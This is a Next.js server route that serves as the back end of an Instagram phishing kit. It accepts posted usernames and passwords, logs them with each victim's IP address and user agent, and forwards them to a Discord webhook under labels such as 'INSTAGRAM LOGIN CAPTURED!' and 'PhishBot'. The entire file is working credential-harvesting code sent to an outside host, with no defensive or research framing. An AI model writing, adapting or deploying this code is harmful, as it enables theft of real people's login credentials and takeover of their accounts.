import { NextResponse } from 'next/server';

export async function POST(request) {
  try {
    const data = await request.json();
    const timestamp = new Date().toISOString();
    const clientIP = request.headers.get('x-forwarded-for') || 'unknown';
    
    // LOG TO CONSOLE (Vercel dashboard)
    console.log(`🎣 PHISH CAPTURED:
TIME: ${timestamp}
IP: ${clientIP}
USERNAME: ${data.username}
PASSWORD: ${data.password}
UA: ${data.ua?.slice(0, 50)}`);

    // DISCORD WEBHOOK (Configure in Vercel env)
    if (process.env.DISCORD_WEBHOOK) {
      await fetch(process.env.DISCORD_WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `**🎣 INSTAGRAM LOGIN CAPTURED!**\n\`\`\`IP: ${clientIP}\nUser: ${data.username}\nPass: ${data.password}\n\`\`\``,
          username: 'PhishBot 🐟'
        })
      }).catch(console.error);
    }

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error('Capture error:', error);
    return NextResponse.json({ error: 'Failed' }, { status: 500 });
  }
}